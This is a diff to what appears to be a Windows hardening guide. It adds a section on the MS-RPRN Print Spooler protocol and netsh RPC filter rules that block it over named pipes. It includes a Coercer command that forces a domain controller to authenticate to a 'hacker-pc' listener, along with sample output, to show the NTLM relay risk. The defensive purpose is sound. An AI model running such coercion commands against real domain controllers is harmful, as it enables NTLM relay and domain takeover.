@@ -567,21 +567,40 @@ add filter
 
 #### \[MS-RPRN\]: Print System Remote Protocol
 
-https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print
+The [\[MS-RPRN\]: Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) with UUID [12345678-1234-ABCD-EF00-0123456789AB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515) is exposed over the `\PIPE\spoolss` named pipe and is a popular target for initiating NTLM relay attacks:
 
-TODO
+```shell
+coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip dc01.contoso.com --listener-ip hacker-pc --filter-transport-name msrpc --filter-protocol MS-RPRN --always-continue
+```
 
 ```txt
-# Block [MS-RPRN]: Print System Remote Protocol
-# Named pipe: \PIPE\spoolss
-# This rule only blocks RPC over Named Pipes,
-# while RPC over TCP is still allowed on Windows 11, version 22H2
-# and later versions of Windows.
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target dc01.contoso.com
+[+] SMB named pipe '\PIPE\spoolss' is accessible!
+   [+] Successful bind to interface (12345678-1234-abcd-ef00-0123456789ab, 1.0)!
+      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.213.0.100\x00')
+      [!] (RPC_S_ACCESS_DENIED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.213.0.100\x00')
+[+] All done! Bye Bye!
+```
+
+The primary solution to this vulnerability is to disable the `Print Spooler` service on domain controllers. As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:
+
+```txt
+rpc filter
 add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
 add condition field=protocol matchtype=equal data=ncacn_np
 add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
 add filter
 ```
+
+> [!NOTE]
+> In a future version of Windows Server, the MS-RPRN protocol will be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print) by default.
 
 #### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
 
